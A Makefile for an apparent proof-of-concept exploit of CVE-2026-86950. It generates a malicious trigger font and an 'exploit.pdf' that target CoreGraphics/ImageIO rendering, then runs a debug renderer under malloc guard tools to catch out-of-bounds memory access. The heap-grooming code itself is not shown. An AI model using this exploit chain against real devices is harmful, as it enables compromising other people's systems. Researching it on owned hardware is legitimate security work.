# CVE-2026-86950 Heap Feng Shui PoC
# Educational research only — for testing on devices you own

CFLAGS = -framework CoreGraphics -framework ImageIO -framework CoreFoundation
CFLAGS += -Wall -g -O0

.PHONY: all clean font pdf run run-guard

all: font pdf render_debug

font: gen_feng_shui_font.py
	python3 gen_feng_shui_font.py feng_shui_trigger.ttf

pdf: font gen_exploit_pdf.py
	python3 gen_exploit_pdf.py exploit.pdf feng_shui_trigger.ttf

render_debug: render_debug.c
	clang $(CFLAGS) -o render_debug render_debug.c

# Run with malloc debugging (detects OOB via guard pages at allocation edges)
run: all
	MallocGuardEdges=1 MallocScribble=1 ./render_debug exploit.pdf

# Run with Guard Malloc (catches every single OOB byte — very slow)
run-guard: all
	DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./render_debug exploit.pdf

clean:
	rm -f render_debug exploit.pdf feng_shui_trigger.ttf *.o
